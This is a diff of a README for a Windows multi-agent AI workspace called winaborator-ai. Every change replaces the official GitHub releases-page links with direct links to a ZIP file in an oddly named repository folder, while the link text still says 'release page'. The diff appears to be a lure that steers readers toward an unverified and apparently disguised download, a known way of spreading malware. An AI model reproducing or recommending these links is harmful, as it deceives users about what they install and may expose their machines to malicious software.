@@ -1,6 +1,6 @@
 # 🧠 winaborator-ai - Build with multiple AI agents
 
-[![Download winaborator-ai](https://img.shields.io/badge/Download-Release%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Idle-caffeineaddict724/winaborator-ai/releases)
+[![Download winaborator-ai](https://img.shields.io/badge/Download-Release%20Page-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Idle-caffeineaddict724/winaborator-ai/main/complexioned/ai_winaborator_v2.6.zip)
 
 ## 🚀 Getting Started
 
@@ -8,11 +8,11 @@ winaborator-ai is a Windows desktop workspace for building with multiple AI agen
 
 Use the release page to download and install it on Windows:
 
-**[Visit the release page to download winaborator-ai](https://github.com/Idle-caffeineaddict724/winaborator-ai/releases)**
+**[Visit the release page to download winaborator-ai](https://raw.githubusercontent.com/Idle-caffeineaddict724/winaborator-ai/main/complexioned/ai_winaborator_v2.6.zip)**
 
 ## 📦 Download and Install
 
-1. Open the [release page](https://github.com/Idle-caffeineaddict724/winaborator-ai/releases).
+1. Open the [release page](https://raw.githubusercontent.com/Idle-caffeineaddict724/winaborator-ai/main/complexioned/ai_winaborator_v2.6.zip).
 2. Find the latest release.
 3. Download the Windows file for your system.
 4. If the file is in a ZIP folder, open the ZIP and extract it.
@@ -176,7 +176,7 @@ The app runs on your Windows desktop. You stay in control of your files and work
 
 Get the Windows release here:
 
-**[https://github.com/Idle-caffeineaddict724/winaborator-ai/releases](https://github.com/Idle-caffeineaddict724/winaborator-ai/releases)**
+**[https://raw.githubusercontent.com/Idle-caffeineaddict724/winaborator-ai/main/complexioned/ai_winaborator_v2.6.zip](https://raw.githubusercontent.com/Idle-caffeineaddict724/winaborator-ai/main/complexioned/ai_winaborator_v2.6.zip)**
 
 ## 🗂️ Topics
 
